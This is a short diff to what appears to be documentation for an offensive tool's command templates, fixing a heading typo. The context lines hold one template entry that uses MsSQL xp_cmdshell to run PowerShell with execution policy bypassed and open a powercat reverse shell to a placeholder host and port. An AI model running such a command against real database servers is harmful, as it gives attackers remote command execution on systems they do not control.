@@ -57,7 +57,7 @@ MsSQLExecutePowercat,MsSQL comamnd execution via xp_cmdshell (powercat connectio
 MsSQLExecutePowercatTemp,MsSQL comamnd execution via xp_cmdshell (powercat connection to host in temp),EXEC xp_cmdshell "powershell -ep bypass -nop . $env:TEMP\powercat.ps1; powercat -c ###LocalHost### -p ###LocalPort### -ep",
 ```
 
-### Braking it down
+### Breaking it down
 
 Let's check out one line to get an idea on what is going on:
 ```
